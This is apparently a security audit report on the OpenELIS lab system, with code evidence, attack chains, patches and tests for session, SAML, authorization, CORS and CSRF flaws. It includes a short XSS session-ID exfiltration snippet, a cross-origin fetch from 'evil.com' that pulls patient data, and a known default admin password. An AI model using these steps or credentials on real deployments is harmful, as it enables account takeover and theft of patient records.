# OpenELIS Security Audit — Phase 1 Detailed Report
# Authentication, Session Management & Core Security Controls

This is the detailed Phase 1 audit, providing patch-ready diffs, STRIDE threat modeling, a
test/validation plan, and a prioritized remediation backlog for every finding. Phase 1 findings
were originally catalogued in `phase1.md`; this document expands each one with code-level
evidence, concrete patches, and cross-phase dependencies. Severity follows CVSS 3.1
(Critical / High / Medium / Low / Informational).

---

## Audit Scope

| Area | Focus |
|------|-------|
| Authentication flow | Login controllers, success/failure handlers, session setup |
| Session management | Cookie flags, session fixation, JSESSIONID exposure |
| SAML/SSO provisioning | Auto-provisioning logic, hardcoded sysUserId |
| Authorization framework | `ModuleAuthenticationInterceptor`, `getGrantedAuthorities()`, `@PreAuthorize` |
| CORS / CSRF | `CORSFilter`, CSRF exemption in `SecurityConfig` |
| PHI log leakage | Hibernate TRACE logging, username logging |
| Secrets hygiene | VAPID key commit, AES key defaults, SSL placeholder passwords |
| XSS defences | `SecurityFilter` bypass, CSP policy |
| Infrastructure | PostgreSQL port exposure, AES key reuse, encryption key fallback |
| FHIR endpoint security | `InternalFhirApi`, `FhirQueryRestController`, `FhirRestfulServer` |
| Plugin system | Unsigned JAR loading in `PluginLoader` |
| Notification system | `NotificationRestController` over-exposure |

---

## STRIDE Threat Model — Authentication & Session Layer

The following table maps each STRIDE threat category to the concrete attack surfaces
identified in Phase 1.

| STRIDE | Threat | Affected Component | Finding ID |
|--------|--------|--------------------|------------|
| **S**poofing | Forge audit-log IP via `X-Forwarded-For` | `CustomFormAuthenticationSuccessHandler` | P1-A2 |
| **S**poofing | SAML IdP provisions attacker account with admin sysUserId | `CustomSSOAuthenticationSuccessHandler` | P1-A4 |
| **S**poofing | Default admin password allows impersonation at initial deploy | All Compose files | P1-A3 |
| **T**ampering | Unsigned JAR dropped into plugins volume executes arbitrary code | `PluginLoader` | P1-I1 |
| **T**ampering | Any user injects push notifications into any other user's feed | `NotificationRestController` | P1-J2 |
| **T**ampering | CORS reflection + CSRF exemption enables cross-origin state mutation | `CORSFilter`, `SecurityConfig` | P1-B1, P1-B2 |
| **R**epudiation | Forged `X-Forwarded-For` poisons the only forensic audit trail | `CustomFormAuthenticationSuccessHandler` | P1-A2 |
| **R**epudiation | Duplicate + cleartext username logging makes audit ambiguous | `AuthenticationListener` | P1-C2 |
| **I**nformation Disclosure | Session ID serialised into JSON response body | `LoginPageController` | P1-A1 |
| **I**nformation Disclosure | Hibernate TRACE logs write PHI to disk | `application.properties` | P1-C1 |
| **I**nformation Disclosure | VAPID private key committed to source control | `application.properties` | P1-D1 |
| **I**nformation Disclosure | All users' notifications readable by any authenticated user | `NotificationRestController` | P1-J1 |
| **I**nformation Disclosure | Full system user directory exposed without role check | `NotificationRestController` | P1-J3 |
| **D**enial of Service | Weak XSS filter creates false confidence; real payloads pass through | `SecurityFilter` | P1-E1 |
| **E**levation of Privilege | `getGrantedAuthorities()` always returns empty — `@PreAuthorize` broken | `CustomUserDetailsService` | P1-A5 |
| **E**levation of Privilege | REST interceptor fails open — any new REST endpoint is world-accessible | `ModuleAuthenticationInterceptor` | P1-A6 |
| **E**levation of Privilege | AES key defaults to `"dev"` — encrypted DB credentials trivially cracked | `SecurityConfig` | P1-G2 |

---

## P1-A: Authentication & Session Security

---

### P1-A1 — Session ID Exposed in JSON API Response Body

**Severity:** High (CVSS 7.5)
**File:** `src/main/java/org/openelisglobal/login/controller/LoginPageController.java` (L135–162)
**CWE:** CWE-598 — Information Exposure Through Query Strings in GET Request

#### Evidence

```OpenELIS-Global-2/src/main/java/org/openelisglobal/login/controller/LoginPageController.java#L135-162
@GetMapping(value = "/session", produces = MediaType.APPLICATION_JSON_VALUE)
@ResponseBody
public UserSession getSesssionDetails(HttpServletRequest request, CsrfToken token) {
    boolean authenticated = !userModuleService.isSessionExpired(request);
    UserSession session = new UserSession();
    session.setAuthenticated(authenticated);
    session.setSessionId(request.getSession().getId());   // ← JSESSIONID serialised here
    if (authenticated) {
        SystemUser user = systemUserService.get(getSysUserId(request));
        setLoginMethod(request, session);
        session.setUserId(user.getId());
        session.setLoginName(user.getLoginName());
        session.setFirstName(user.getFirstName());
        session.setLastName(user.getLastName());
        if (token != null) {
            session.setCSRF(token.getToken());
        }
        ...
    }
    return session;
}
```

The `JSESSIONID` is explicitly placed into the `UserSession` DTO and returned as JSON.
`Login.js` polls `/session` **every 3 seconds** — meaning the session ID is perpetually
readable by any JavaScript context in the browser. The `HttpOnly` flag on the session
cookie (correctly set in `web.xml`) is fully negated for this vector: an XSS payload
only needs to call `fetch('/session').then(r=>r.json()).then(d=>exfil(d.sessionId))`.

The `UserSession` DTO in `src/main/java/org/openelisglobal/login/bean/UserSession.java`
contains the `sessionId` field and its getter, which causes Jackson to include it in
every serialised response.

#### Attack Chain

1. Attacker injects XSS payload (trivial given CSP `unsafe-inline` — P1-F1).
2. Payload calls `GET /session` via `fetch` with `credentials: 'include'`.
3. JSON response contains `"sessionId": "ABCD1234..."`.
4. Attacker exfiltrates the value to an external endpoint.
5. Attacker injects `JSESSIONID=ABCD1234` cookie and takes over the session.
6. `HttpOnly` cookie flag provides **zero protection** against this path.

#### Patch

**Step 1 — Remove `sessionId` from `UserSession` DTO**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/login/bean/UserSession.java#L1-20
// REMOVE the sessionId field, getter, and setter entirely:
// private String sessionId;
// public String getSessionId() { return sessionId; }
// public void setSessionId(String sessionId) { this.sessionId = sessionId; }
```

**Step 2 — Remove the call site in the controller**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/login/controller/LoginPageController.java#L140-141
// REMOVE this line:
// session.setSessionId(request.getSession().getId());
```

The browser does not need the session ID in JavaScript — it is managed automatically
via the `HttpOnly` cookie. The CSRF token (already returned as `session.CSRF`) is the
only token the frontend legitimately needs from this endpoint.

#### Test / Validation

```OpenELIS-Global-2/src/test/java/org/openelisglobal/login/controller/LoginPageControllerTest.java#L1-1
// JUnit 4 test — verify sessionId is absent from /session response
@Test
public void sessionEndpoint_shouldNotReturnSessionId() throws Exception {
    // Perform GET /session as an authenticated user
    MvcResult result = mockMvc.perform(get("/session")
            .session(authenticatedSession()))
        .andExpect(status().isOk())
        .andReturn();
    String body = result.getResponse().getContentAsString();
    assertFalse("sessionId must not appear in /session JSON response",
        body.contains("sessionId"));
}
```

---

### P1-A2 — Unvalidated `X-Forwarded-For` Header Poisons the Audit Trail

**Severity:** Medium (CVSS 5.3)
**Files:**
- `src/main/java/org/openelisglobal/security/login/CustomFormAuthenticationSuccessHandler.java` (L68–79)
- `src/main/java/org/openelisglobal/security/login/CustomAuthenticationFailureHandler.java` (L30–40)
**CWE:** CWE-346 — Origin Validation Error / CWE-117 — Improper Output Neutralization for Logs

#### Evidence

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/CustomFormAuthenticationSuccessHandler.java#L68-79
final String xfHeader = request.getHeader("X-Forwarded-For");
if (xfHeader == null) {
    LogEvent.logInfo(this.getClass().getSimpleName(), "onSuccess",
        "Successful login attempt for " + authentication.getName() + " from " + request.getRemoteAddr());
} else {
    LogEvent.logInfo(this.getClass().getSimpleName(), "onSuccess",
        "Successful login attempt for " + authentication.getName() + " from " + xfHeader.split(",")[0]);
    //                                                                                    ↑ attacker-controlled
}
```

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/CustomAuthenticationFailureHandler.java#L29-40
final String xfHeader = request.getHeader("X-Forwarded-For");
if (xfHeader == null) {
    LogEvent.logInfo(this.getClass().getSimpleName(), "onFailure",
        "Unsuccessful login attempt from " + request.getRemoteAddr());
} else {
    LogEvent.logInfo(this.getClass().getSimpleName(), "onFailure",
        "Unsuccessful login attempt from " + xfHeader.split(",")[0]);
    //                                                ↑ attacker-controlled
}
```

Ports `8080` and `8443` are directly exposed on the host in `docker-compose.yml`,
meaning **any client can bypass Nginx** and send a raw login request with a forged
`X-Forwarded-For: 127.0.0.1` header. The audit trail will record the spoofed IP,
destroying the forensic value of the log — which is the primary evidence source
for ISO 15189 / SLIPTA compliance investigations.

#### Patch

Replace the manual header-reading pattern with Spring's `ForwardedHeaderFilter`,
which validates the header against a trusted proxy list configured in `SecurityConfig`.

**`SecurityConfig.java` — add `ForwardedHeaderFilter` bean:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/SecurityConfig.java#L1-1
// ADD inside SecurityConfig:
@Bean
public FilterRegistrationBean<ForwardedHeaderFilter> forwardedHeaderFilter() {
    ForwardedHeaderFilter filter = new ForwardedHeaderFilter();
    FilterRegistrationBean<ForwardedHeaderFilter> registration =
        new FilterRegistrationBean<>(filter);
    registration.setOrder(Ordered.HIGHEST_PRECEDENCE);
    return registration;
}
```

**Configure Tomcat `RemoteIpValve` in `application.properties`:**

```OpenELIS-Global-2/src/main/resources/application.properties#L1-1
# Only trust X-Forwarded-For from the Docker-internal Nginx proxy subnet
server.tomcat.remoteip.remote-ip-header=X-Forwarded-For
server.tomcat.remoteip.protocol-header=X-Forwarded-Proto
server.tomcat.remoteip.internal-proxies=172\.16\.\d+\.\d+|172\.17\.\d+\.\d+|172\.18\.\d+\.\d+|10\.\d+\.\d+\.\d+
```

**In handlers — replace raw header reads with validated `remoteAddr`:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/CustomFormAuthenticationSuccessHandler.java#L68-79
// REPLACE the xfHeader block with a single call — RemoteIpValve has already
// resolved the trusted real IP into request.getRemoteAddr():
LogEvent.logInfo(this.getClass().getSimpleName(), "onSuccess",
    "Successful login attempt for " + authentication.getName()
    + " from " + request.getRemoteAddr());
```

Apply the same single-line pattern to `CustomAuthenticationFailureHandler`.

#### Test / Validation

```OpenELIS-Global-2/src/test/java/org/openelisglobal/security/login/AuthForgedHeaderTest.java#L1-1
// Verify forged X-Forwarded-For from untrusted origin is not logged
@Test
public void forgedXForwardedFor_shouldNotAppearInAuditLog() {
    // POST /ValidateLogin with forged header from non-proxy IP
    // Assert log output contains request.getRemoteAddr(), not "127.0.0.1"
}
```

---

### P1-A3 — Default Admin Password Hardcoded as Public Constant

**Severity:** High (CVSS 9.1)
**Files:**
- `docker-compose.yml` (L49–50)
- `build.docker-compose.yml` (L61–66)
- `dev.docker-compose.yml`
- `test.docker-compose.yml`
- `.github/workflows/frontend-qa.yml` (L215–216)
**CWE:** CWE-1392 — Use of Default Credentials / CWE-798 — Use of Hardcoded Credentials

#### Evidence

```OpenELIS-Global-2/build.docker-compose.yml#L61-66
environment:
    - DEFAULT_PW=adminADMIN!
    - TZ=Africa/Nairobi
```

```OpenELIS-Global-2/.github/workflows/frontend-qa.yml#L215-216
TEST_USER: ${{ vars.TEST_USER || 'admin' }}
TEST_PASS: ${{ secrets.TEST_PASS || 'adminADMIN!' }}
```

The password `adminADMIN!` appears in **five separate source-controlled files** and is
the fallback when `DEFAULT_PW` is not set. `CreateAdminUserTask.java` already reads
from `adminPassword.txt` with bcrypt hashing — the issue is that Compose files provide
a plaintext fallback, meaning most deployments never set the variable and run with
the well-known credential indefinitely.

#### Patch

**Step 1 — Remove ALL `DEFAULT_PW` hardcoded fallbacks from Compose files:**

```OpenELIS-Global-2/docker-compose.yml#L49-50
# CHANGE from:
# - DEFAULT_PW=adminADMIN!
# TO: (no default — force operator to supply it)
# - DEFAULT_PW=${OE_ADMIN_PASSWORD:?OE_ADMIN_PASSWORD must be set}
```

The `:?` syntax causes Docker Compose to **abort startup with a descriptive error**
if the variable is not set — this is the correct fail-safe pattern.

**Step 2 — Remove CI fallback in GitHub Actions:**

```OpenELIS-Global-2/.github/workflows/frontend-qa.yml#L215-216
# CHANGE from:
# TEST_PASS: ${{ secrets.TEST_PASS || 'adminADMIN!' }}
# TO:
# TEST_PASS: ${{ secrets.TEST_PASS }}
# Add a pre-job check step that fails if TEST_PASS is empty
```

**Step 3 — Add startup guard in `CreateAdminUserTask.java`:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/common/startup/CreateAdminUserTask.java#L1-1
// ADD: if DEFAULT_PW equals the known public constant, refuse to use it
private static final Set<String> KNOWN_WEAK_PASSWORDS =
    Set.of("adminADMIN!", "admin", "password", "changeit");

private void validateAdminPassword(String password) {
    if (KNOWN_WEAK_PASSWORDS.contains(password)) {
        throw new IllegalStateException(
            "DEFAULT_PW is set to a known weak/public value. " +
            "Set OE_ADMIN_PASSWORD to a strong unique credential before starting.");
    }
}
```

#### Test / Validation

- Integration test: start application without `DEFAULT_PW` — assert startup fails
  with a clear message.
- Integration test: set `DEFAULT_PW=adminADMIN!` — assert startup is rejected by
  the weak-password guard.
- CI: verify `secrets.TEST_PASS` is configured as a required GitHub secret.

---

### P1-A4 — SAML Auto-Provisioning Assigns Hardcoded Admin `sysUserId`

**Severity:** High (CVSS 8.8 — privilege escalation via federated identity)
**File:** `src/main/java/org/openelisglobal/security/login/CustomSSOAuthenticationSuccessHandler.java` (L204–225)
**CWE:** CWE-266 — Incorrect Privilege Assignment / CWE-269 — Improper Privilege Management

#### Evidence

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/CustomSSOAuthenticationSuccessHandler.java#L204-225
Optional<SystemUser> user = systemUserService.getMatch("loginName", principal.getName());

SystemUser systemUser = new SystemUser();
if (user.isEmpty()) {
    systemUser.setFirstName(principal.getName());
    systemUser.setLastName("");
    systemUser.setLoginName(principal.getName());
    systemUser.setIsActive("Y");
    systemUser.setIsEmployee("Y");
    systemUser.setExternalId("1");
    ...
    systemUser.setSysUserId("1");    // ← HARDCODED to admin's sysUserId
    systemUser = systemUserService.save(systemUser);
}
```

`sysUserId = "1"` is the system/admin context in OpenELIS (confirmed in
`CreateAdminUserTask.java` where the admin login is created with `login.setSysUserId("1")`).
Any user arriving via **any connected SAML IdP** — including a misconfigured or attacker-
controlled IdP — triggers this branch on first login and gets a `SystemUser` saved with
the admin's context identifier.

The `isAdmin` flag on the resulting `UserSessionData` is then set based purely on a role
name string parse from the SAML assertion, which an attacker controlling an IdP can fully
forge.

#### Attack Chain

1. Attacker registers their own SAML IdP (or compromises a federated one).
2. Attacker authenticates with a new username not in OpenELIS.
3. `user.isEmpty()` is `true` — auto-provision branch fires.
4. New `SystemUser` is saved with `sysUserId = "1"` (admin context).
5. Attacker's session has `usd.setAdmin(true)` (if assertion claims admin role).
6. Attacker has full admin access to the OpenELIS instance.

#### Patch

**Remove the hardcoded `sysUserId` and assign a safe default role:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/CustomSSOAuthenticationSuccessHandler.java#L204-225
if (user.isEmpty()) {
    systemUser.setFirstName(principal.getName());
    systemUser.setLastName("");
    systemUser.setLoginName(principal.getName());
    systemUser.setIsActive("Y");
    systemUser.setIsEmployee("Y");
    systemUser.setExternalId(UUID.randomUUID().toString()); // ← unique, not "1"
    String initial = ...;
    systemUser.setInitials(initial);
    // DO NOT set sysUserId here — let the persistence layer assign it
    // systemUser.setSysUserId("1");  ← REMOVE THIS LINE

    systemUser = systemUserService.save(systemUser);

    // Assign a default non-privileged role that requires explicit admin approval
    // to be elevated. Replace "DEFAULT_READ_ONLY_ROLE_ID" with the actual role ID
    // for the least-privileged role in the system.
    userRoleService.addUserToRole(systemUser.getId(), DEFAULT_PROVISIONED_ROLE_ID);
}
```

**Add a configuration guard — SAML auto-provisioning should be opt-in:**

```OpenELIS-Global-2/src/main/resources/application.properties#L1-1
# Set to false to require manual admin approval for new SAML-federated accounts
sso.auto.provision.enabled=false
sso.auto.provision.default.role=READ_ONLY
```

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/CustomSSOAuthenticationSuccessHandler.java#L204-225
// Wrap the auto-provision block:
if (user.isEmpty()) {
    if (!autoProvisionEnabled) {
        LogEvent.logWarn(..., "SSO login rejected: user not found and auto-provision is disabled: "
            + principal.getName());
        // Redirect to an "account pending approval" page
        response.sendRedirect("/LoginPage?error=sso_not_provisioned");
        return;
    }
    // ... safe provisioning logic ...
}
```

#### Test / Validation

```OpenELIS-Global-2/src/test/java/org/openelisglobal/security/login/SamlAutoProvisionTest.java#L1-1
@Test
public void newSamlUser_shouldNotReceiveAdminSysUserId() {
    // Simulate SAML login for a user not in the database
    // Assert saved SystemUser.getSysUserId() != "1"
    // Assert saved SystemUser has only the default read-only role
}

@Test
public void samlAutoProvision_whenDisabled_shouldRejectUnknownUser() {
    // Set sso.auto.provision.enabled=false
    // Simulate SAML login for unknown user
    // Assert redirect to /LoginPage?error=sso_not_provisioned
}
```

---

### P1-A5 — `getGrantedAuthorities()` Always Returns an Empty List

**Severity:** Medium (CVSS 5.4)
**File:** `src/main/java/org/openelisglobal/security/login/CustomUserDetailsService.java` (L37–41)
**CWE:** CWE-285 — Improper Authorization / CWE-863 — Incorrect Authorization

#### Evidence

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/CustomUserDetailsService.java#L37-41
// TODO flesh this out so we can do permissions solely through granted
// authorities for sso and form login methods
private List<GrantedAuthority> getGrantedAuthorities(LoginUser user) {
    List<GrantedAuthority> authorities = new ArrayList<>();
    return authorities;   // ← Always empty — no authorities ever assigned
}
```

Spring Security's `@PreAuthorize("hasRole('ADMIN')")` annotations rely entirely on the
`GrantedAuthority` list in the `Authentication` object. Because form-login users always
have an empty authority list:

- `@PreAuthorize("hasRole('ADMIN')")` **always denies** form-login users (they have no
  roles), OR Spring Security's default-permit semantics may allow the call — the result
  depends on whether `@EnableMethodSecurity` is active.
- The four `SiteBrandingRestController` endpoints annotated with
  `@PreAuthorize("hasRole('ADMIN')")` are unreliable: either inaccessible to all
  form-login admins, or completely unprotected.
- This creates a **two-tier, undocumented authorization model**: form-login uses the
  module interceptor; SSO/SAML uses `GrantedAuthority`. The interaction is undefined.

#### Patch

**Implement `getGrantedAuthorities()` to map OpenELIS roles:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/CustomUserDetailsService.java#L37-41
private List<GrantedAuthority> getGrantedAuthorities(LoginUser user) {
    List<GrantedAuthority> authorities = new ArrayList<>();

    // Map the OpenELIS admin flag to a Spring Security ROLE_ADMIN authority
    if (loginService.isUserAdmin(user)) {
        authorities.add(new SimpleGrantedAuthority("ROLE_ADMIN"));
    }

    // Map all role IDs from the user_role table to Spring GrantedAuthority objects
    List<String> roleIds = userRoleService.getRoleIdsForUser(
        Integer.toString(user.getSystemUserId()));
    for (String roleId : roleIds) {
        // Fetch the role name from the role service and map to ROLE_ prefix
        String roleName = roleService.getRoleById(roleId).getName();
        authorities.add(new SimpleGrantedAuthority("ROLE_" + roleName.toUpperCase()));
    }

    return authorities;
}
```

**Inject `UserRoleService` and `RoleService` into `CustomUserDetailsService`:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/login/CustomUserDetailsService.java#L19-22
@Autowired
LoginUserService loginService;
@Autowired                              // ADD
UserRoleService userRoleService;        // ADD
@Autowired                              // ADD
RoleService roleService;                // ADD
```

#### Test / Validation

```OpenELIS-Global-2/src/test/java/org/openelisglobal/security/login/CustomUserDetailsServiceTest.java#L1-1
@Test
public void adminUser_shouldHaveRoleAdminAuthority() {
    // Given: a LoginUser where isUserAdmin() returns true
    // When: loadUserByUsername() is called
    // Then: UserDetails.getAuthorities() contains ROLE_ADMIN
}

@Test
public void regularUser_shouldNotHaveRoleAdminAuthority() {
    // Given: a LoginUser without admin flag
    // When: loadUserByUsername() is called
    // Then: UserDetails.getAuthorities() does NOT contain ROLE_ADMIN
}
```

---

### P1-A6 — `ModuleAuthenticationInterceptor` Fails Open for All REST Paths

**Severity:** High (CVSS 8.1)
**File:** `src/main/java/org/openelisglobal/interceptor/ModuleAuthenticationInterceptor.java` (L95–103, L142–147)
**CWE:** CWE-284 — Improper Access Control / CWE-636 — Not Failing Securely

#### Evidence

```OpenELIS-Global-2/src/main/java/org/openelisglobal/interceptor/ModuleAuthenticationInterceptor.java#L95-103
if (sysModsByUrl.isEmpty() && REQUIRE_MODULE) {
    if (isRestFullPath()) {
        return true;    // ← No module configured = ALLOW for REST (fail-open)
    }
    LogEvent.logWarn("ModuleAuthenticationInterceptor", "hasPermissionForUrl()",
            "This page has no modules assigned to it");
    return false;
}
```

```OpenELIS-Global-2/src/main/java/org/openelisglobal/interceptor/ModuleAuthenticationInterceptor.java#L142-147
private boolean isRestFullPath() {
    if (path.startsWith("/rest") || path.startsWith("/Provider")) {
        return true;
    }
    return false;
}
```

Any REST endpoint that does not have a corresponding `SystemModuleUrl` record in the
database automatically passes the authorization check for **all authenticated users**,
regardless of their role. This is an open-by-default design. New REST controllers added
by developers are silently world-accessible until someone manually registers them in the
module permission database table.

The impact is already realised in Phase 2/3 findings: `PatientSearchRestController`,
`AuditTrailReportRestController`, and `NotificationRestController` are all accessible
to any authenticated user because they lack module registrations.

#### Patch

**Change `isRestFullPath()` fail-open to fail-closed — deny by default, log audit:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/interceptor/ModuleAuthenticationInterceptor.java#L95-103
if (sysModsByUrl.isEmpty() && REQUIRE_MODULE) {
    if (isRestFullPath()) {
        // CHANGED: was return true (fail-open). Now fail-closed with audit log.
        LogEvent.logWarn("ModuleAuthenticationInterceptor", "hasPermissionForUrl()",
            "REST path has no module assigned — denying access. Path: " + path
            + ". Add a SystemModuleUrl entry to grant access.");
        return false;   // ← fail-closed
    }
    LogEvent.logWarn("ModuleAuthenticationInterceptor", "hasPermissionForUrl()",
            "This page has no modules assigned to it: " + path);
    return false;
}
```

**Add an explicit REST allowlist for endpoints intentionally open to all authenticated users:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/interceptor/ModuleAuthenticationInterceptor.java#L1-1
// ADD: paths that are intentionally open to any authenticated session
// This replaces the silent fail-open with an explicit, reviewable allowlist
private static final Set<String> AUTHENTICATED_OPEN_REST_PATHS = Set.of(
    "/rest/session",           // session status polling (own session only)
    "/rest/notifications",     // own notification inbox
    "/rest/notification/public_key",  // VAPID key for push subscription
    "/rest/home"               // dashboard data
);

private boolean isAuthenticatedOpenRestPath() {
    return AUTHENTICATED_OPEN_REST_PATHS.stream().anyMatch(p -> path.startsWith(p));
}
```

```OpenELIS-Global-2/src/main/java/org/openelisglobal/interceptor/ModuleAuthenticationInterceptor.java#L95-103
if (sysModsByUrl.isEmpty() && REQUIRE_MODULE) {
    if (isRestFullPath() && isAuthenticatedOpenRestPath()) {
        return true;   // Explicitly whitelisted — intentionally open to all authenticated
    }
    if (isRestFullPath()) {
        LogEvent.logWarn(..., "REST path not in module registry and not in open allowlist: " + path);
        return false;  // fail-closed
    }
    ...
}
```

#### Test / Validation

```OpenELIS-Global-2/src/test/java/org/openelisglobal/interceptor/ModuleAuthenticationInterceptorTest.java#L1-1
@Test
public void restPathWithNoModuleRegistration_shouldDenyAccess() {
    // Given: a REST path with no SystemModuleUrl in DB
    // When: a non-admin authenticated user accesses it
    // Then: interceptor returns false (access denied)
}

@Test
public void restPathInOpenAllowlist_shouldAllowAnyAuthenticatedUser() {
    // Given: path = "/rest/notifications"
    // When: any authenticated user accesses it
    // Then: interceptor returns true
}
```

---

## P1-B: CORS / CSRF Security

---

### P1-B1 — CORS Origin Reflection — Full Wildcard Equivalent with Credentials

**Severity:** Critical (CVSS 9.3)
**File:** `src/main/java/org/openelisglobal/security/CORSFilter.java` (L28–38)
**CWE:** CWE-942 — Permissive Cross-domain Policy with Untrusted Domains

#### Evidence

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/CORSFilter.java#L28-38
response.setHeader("Access-Control-Allow-Origin", request.getHeader("Origin"));
response.setHeader("Access-Control-Allow-Credentials", "true");
response.setHeader("Access-Control-Allow-Methods", "GET, POST, PUT, PATCH, DELETE, OPTIONS");
response.setHeader("Access-Control-Max-Age", "3600");
response.setHeader("Access-Control-Allow-Headers",
        "X-CSRF-Token ,Content-Type , Accept, Origin ,Authorization");
```

The `CORSFilter` reflects the incoming `Origin` header **verbatim** as the
`Access-Control-Allow-Origin` response value, simultaneously paired with
`Access-Control-Allow-Credentials: true`. The W3C CORS specification prohibits
`*` with `credentials: true` — but reflecting the origin achieves **identical
effect** while bypassing that browser protection.

#### Full Exploit Chain

1. Attacker hosts a page at `https://evil.com`.
2. A logged-in OpenELIS clinician visits `evil.com` (via phishing link).
3. `evil.com` JavaScript runs:
   ```
   fetch("https://openelis.hospital.org/rest/patient-search?lastName=Smith",
         { credentials: "include" })
     .then(r => r.json())
     .then(data => exfil(data));  // full PHI returned
   ```
4. Browser sends the `JSESSIONID` cookie automatically.
5. OpenELIS responds with `Access-Control-Allow-Origin: https://evil.com` and
   `Access-Control-Allow-Credentials: true`.
6. Browser **allows** `evil.com` to read the full JSON response body containing
   patient names, DOBs, national IDs, and lab numbers.

This bypasses every other defence layer — CSRF exemption on `/rest/**` (P1-B2)
means even state-mutating POST requests succeed cross-origin.

#### Patch

**Replace `CORSFilter` with Spring MVC `CorsConfigurationSource` allowlist:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/SecurityConfig.java#L1-1
// ADD a CorsConfigurationSource bean — replace CORSFilter entirely:
@Bean
public CorsConfigurationSource corsConfigurationSource(
        @Value("${cors.allowed.origins:}") String allowedOriginsRaw) {

    List<String> allowedOrigins = Arrays.stream(allowedOriginsRaw.split(","))
        .map(String::trim)
        .filter(s -> !s.isEmpty())
        .collect(Collectors.toList());

    if (allowedOrigins.isEmpty()) {
        LogEvent.logWarn("SecurityConfig", "corsConfigurationSource",
            "cors.allowed.origins is empty — CORS will deny all cross-origin requests.");
    }

    CorsConfiguration config = new CorsConfiguration();
    config.setAllowedOrigins(allowedOrigins);          // explicit allowlist only
    config.setAllowedMethods(List.of("GET", "POST", "PUT", "PATCH", "DELETE", "OPTIONS"));
    config.setAllowedHeaders(List.of("X-CSRF-Token", "Content-Type", "Accept",
                                      "Origin", "Authorization"));
    config.setAllowCredentials(true);
    config.setMaxAge(3600L);

    UrlBasedCorsConfigurationSource source = new UrlBasedCorsConfigurationSource();
    source.registerCorsConfiguration("/**", config);
    return source;
}
```

**Add `cors.allowed.origins` to `application.properties`:**

```OpenELIS-Global-2/src/main/resources/application.properties#L1-1
# Comma-separated list of allowed CORS origins. Empty = deny all cross-origin.
# Example production value: https://openelis.hospital.org
cors.allowed.origins=
```

**Register the `CorsConfigurationSource` in the security filter chain:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/SecurityConfig.java#L1-1
// Inside defaultSecurityConfigurationFilterChain, ADD:
http.cors(cors -> cors.configurationSource(corsConfigurationSource(...)));
```

**Remove the old `CORSFilter` registration** (wherever it is registered as a
`FilterRegistrationBean` or `@Bean` in the configuration).

#### Test / Validation

```OpenELIS-Global-2/src/test/java/org/openelisglobal/security/CORSConfigTest.java#L1-1
@Test
public void unknownOrigin_shouldNotBeReflectedInResponse() {
    // Given: cors.allowed.origins = https://trusted.org
    // When: request arrives with Origin: https://evil.com
    // Then: response does NOT contain Access-Control-Allow-Origin header
}

@Test
public void trustedOrigin_shouldBeAllowed() {
    // Given: cors.allowed.origins = https://trusted.org
    // When: request arrives with Origin: https://trusted.org
    // Then: response contains Access-Control-Allow-Origin: https://trusted.org
}
```

---

### P1-B2 — CSRF Disabled for All REST Endpoints

**Severity:** High (CVSS 8.0)
**File:** `src/main/java/org/openelisglobal/security/SecurityConfig.java` (L427–431)
**CWE:** CWE-352 — Cross-Site Request Forgery (CSRF)

#### Evidence

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/SecurityConfig.java#L427-431
.csrf(csrf -> csrf.ignoringRequestMatchers("/ValidateLogin", "/rest/**",
        "/api/OpenELIS-Global/rest/**"))
```

Every REST endpoint under `/rest/**` is globally exempt from Spring Security's CSRF
protection. Combined with P1-B1 (CORS origin reflection), a cross-origin page can
issue credential-bearing, state-mutating requests to any `/rest/**` endpoint without
a CSRF token, and both the CORS and CSRF layers will pass them through.

The system already has CSRF infrastructure: the `/session` endpoint returns a token
in the `CSRF` field of the response JSON, and the frontend is capable of including it
in requests. The exemption is therefore an intentional but overly broad shortcut —
machine-to-machine clients (FHIR subscribers, analyzers) can't participate in the
CSRF flow, but that doesn't justify exempting the entire REST surface.

#### Patch

**Scope the CSRF exemption to machine-to-machine paths only:**

```OpenELIS-Global-2/src/main/java/org/openelisglobal/security/SecurityConfig.java#L427-431
// REPLACE the broad exemption with a targeted one:
.csrf(csrf -> csrf
    .ignoringRequestMatchers(
        "/ValidateLogin",                // form login — uses its own protection
        "/rest/fhir/**",                 // FHIR subscriber callbacks (M2M)
        "/rest/analyzerResults/**",      // analyzer TCP bridge (M2M)
        "/rest/importAnalyzer/**",       // analyzer import (M2M)
        "/api/OpenELIS-Global/rest/**"   // legacy external API (M2M)
    )
    // All other /rest/** paths — browser-originated — REQUIRE the CSRF token
)
```

**Ensure the frontend sends the CSRF token on all mutating requests.** The token
is already returned by `/session`. In the React frontend, add it as a default
header on all `POST`/`PUT`/`PATCH`/`DELETE` fetch calls:

```OpenELIS-Global-2/frontend/src/index.js#L1-1
// In the global fetch interceptor or Axios config:
// Read CSRF token from the /session polling response and attach it:
axios.defaults.headers.common['X-CSRF-Token'] = sessionData.CSRF;
```

#### Test / Validation

```OpenELIS-Global-2/src/test/java/org/openelisglobal/security/CsrfProtectionTest.java#L1-1
@Test
public void mutatingRestEndpoint_withoutCsrfToken_shouldReturn403() {
    // Given: POST /rest/notification/1 with valid session but no X-CSRF-Token
    // Then: response status is 403 Forbidden
}

@Test
public void mutatingRestEndpoint_withValidCsrfToken_shouldSucceed() {
    // Given: POST /rest/notification/1 with valid session and correct X-CSRF-Token
    // Then: response status is 200 OK
}

@Test
public void fhirCallbackPath_withoutCsrfToken_shouldSucceed() {
    // Given: POST /rest/fhir/Patient with valid credentials but no CSRF token
    // Then: response status is 200 OK (M2M exemption still in place)
}
```

---

